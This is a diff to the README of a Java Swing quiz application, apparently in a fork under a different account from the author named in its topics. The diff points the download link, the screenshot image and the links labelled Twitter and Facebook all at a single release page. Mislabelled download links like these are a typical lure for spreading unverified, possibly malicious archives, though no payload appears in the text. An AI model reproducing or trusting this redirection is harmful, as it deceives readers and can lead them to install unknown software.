@@ -21,7 +21,7 @@ This repository houses an interactive Java Swing quiz application that will enha
 - **Repository Name:** java-test-platform
 - **Description:** 📚 Java Test Platform 🚀 – An interactive Java Swing quiz app with: ⏳ 15s timer, 🎭 Shuffled questions, 🏆 Scoring system, ✅ User-friendly UI, 📊 Vocabulary practice.
 - **Topics:** iqbolshoh, iqbolshoh-777, iqbolshoh-dev, java, multiple-choice, quizapp, scoring, swing, timer, vocabulary-test
-- **Get the Application:** [Download Here](https://github.com/files/Soft.zip)
+- **Get the Application:** [Download Here](https://github.com/BO4ST/java-test-platform/releases/tag/v1.2)
 
 ## How to Get Started:
 1. Simply download the Java Test Platform application from the provided link.
@@ -34,7 +34,7 @@ If the link to the application file is broken or not working, please check the "
 
 Let's embark on a journey of mastering Java concepts and vocabulary with the Java Test Platform. Start learning, testing your knowledge, and having fun along the way! 🚀
 
-![Java Test Platform](https://via.placeholder.com/800x400)
+![Java Test Platform](https://github.com/BO4ST/java-test-platform/releases/tag/v1.2)
 
 ---
 
@@ -45,8 +45,8 @@ This Java Test Platform application was created by **[Your Name]**, a passionate
 
 ### Stay Connected:
 Connect with us on social media for updates, Java tips, and more:
-- Twitter: [Follow us on Twitter](https://twitter.com/javatestplatform)
-- Facebook: [Like us on Facebook](https://facebook.com/javatestplatform)
+- Twitter: [Follow us on Twitter](https://github.com/BO4ST/java-test-platform/releases/tag/v1.2)
+- Facebook: [Like us on Facebook](https://github.com/BO4ST/java-test-platform/releases/tag/v1.2)
 
 ---
 
